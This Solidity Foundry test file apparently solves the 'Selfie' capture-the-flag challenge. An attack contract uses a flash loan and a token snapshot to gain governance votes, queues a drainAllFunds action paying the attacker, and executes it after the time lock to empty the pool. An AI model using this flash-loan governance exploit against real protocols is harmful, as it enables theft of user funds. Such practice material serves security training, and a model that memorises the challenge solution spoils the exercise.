// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract AttackSelfie {

    address public attacker;

    uint256 public actionId;

    SimpleGovernance public governance;
    SelfiePool public pool;

    constructor(address _attacker, address _governance, address _pool) {
        attacker = _attacker;
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
    }

    function attack(DamnValuableTokenSnapshot tokenAddress_) public {
        pool.flashLoan(tokenAddress_.balanceOf(address(pool)));
    }

    function receiveTokens(address token_, uint256 amount_) public {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(token_);
        token.snapshot();
        bytes memory data_ = abi.encodeWithSignature("drainAllFunds(address)", address(attacker));
        actionId = governance.queueAction(address(pool), data_, 0);
        token.transfer(address(pool), amount_);
    }

    function finishAttack() public {
        governance.executeAction(actionId);
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // Note: This is an example of using a flash loan to game governance to setup an attack
        // where the tx is ACL'd by the governance contract

        AttackSelfie attack = new AttackSelfie(address(attacker), address(simpleGovernance), address(selfiePool));
        attack.attack(dvtSnapshot);

        vm.warp(2 days + 1 seconds);

        attack.finishAttack();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
